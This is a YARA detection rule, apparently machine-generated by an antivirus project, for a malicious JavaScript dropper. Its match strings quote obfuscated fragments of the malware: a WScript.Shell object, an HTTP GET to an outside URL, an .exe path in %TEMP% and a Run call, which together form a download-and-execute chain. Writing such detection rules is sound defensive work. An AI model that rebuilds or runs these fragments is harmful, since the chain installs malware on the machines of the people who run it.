rule sig_20160328_704ff399623e241f0688916c072a3f8b {
  meta:
    description = "datamaliciousorder - file 20160328_704ff399623e241f0688916c072a3f8b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "418128ce1f8b8a36179f0a43cbbbd48aee92872d9cf53893eb865827cb4ab088"

  strings:
    $s1  = "function Uhljdsy() {return Mixzhbdn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"TUo8mgnP6YD.exe\";};" fullword ascii
    $s2  = "do {WScript[Aamyv](Lqudzstwzx() * 11)} while (Vhcylrs[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Mixzhbdn = function Shntq() {return WScript[Cxhtko](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Vhcylrs[Bjampnkz](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "function Pqlxgl(Ypifmtd, Hacktjku){return Ypifmtd - Hacktjku;};" fullword ascii
    $s6  = "function Jxaekyf() {return ((Kpflboyliw == true) && (Kpflboyliw == Rjjcg)) ? 1 : Dsvfe;};" fullword ascii
    $s7  = "function Tumpjaala(Sqnxtbtb){Mixzhbdn[\"Run\"](Sqnxtbtb, Dsvfe, Dsvfe);};" fullword ascii
    $s8  = "function Ilixsv(Tcmeh) {var Hudcefdhf = (1, 2, 3, 4, 5, Tcmeh); return Hudcefdhf;};" fullword ascii
    $s9  = "var Sajpgnpzw = false;" fullword ascii
    $s10 = "return Pqlxgl(Qtqyae, Nmtooqww);" fullword ascii
    $s11 = " while (Kouueaowb){" fullword ascii
    $s12 = "function Xxfwmll(){return Cxhtko;};" fullword ascii
    $s13 = "function Lqudzstwzx(){return 22;};" fullword ascii
    $s14 = "var Rjjcg = false;" fullword ascii
    $s15 = "var Kpflboyliw = false;" fullword ascii
    $s16 = "function Dybtoh()" fullword ascii
    $s17 = "function Zqunw(){return Sdvqp;};" fullword ascii
    $s18 = "var Cgdro = new this[\"Date\"]();" fullword ascii
    $s19 = "Rjjcg = true; " fullword ascii
    $s20 = "Kpflboyliw = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}